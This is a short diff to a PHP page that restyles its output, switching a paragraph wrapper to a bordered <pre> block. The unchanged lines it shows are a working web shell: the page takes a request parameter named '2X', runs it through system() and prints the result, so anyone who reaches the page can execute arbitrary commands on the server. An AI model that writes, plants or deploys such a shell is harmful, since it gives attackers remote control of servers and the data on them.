@@ -1,7 +1,9 @@
 <head>
 <style>
-    p {text-align:center;
-        color:green;
+    pre {color:green;
+        border: 5px solid;
+        border-radius:10px;
+        border-color:black;
         background-color:black;
         font-size: 20;}
     body {background-color:gray}
@@ -11,9 +13,9 @@
 <?php
 if(isset($_REQUEST['2X'])){
     $command = $_REQUEST['2X'];
-    echo "<p>";
+    echo "<pre>";
     system($command);
-    echo "</p>";
+    echo "</pre>";
     die;
 }
 ?>
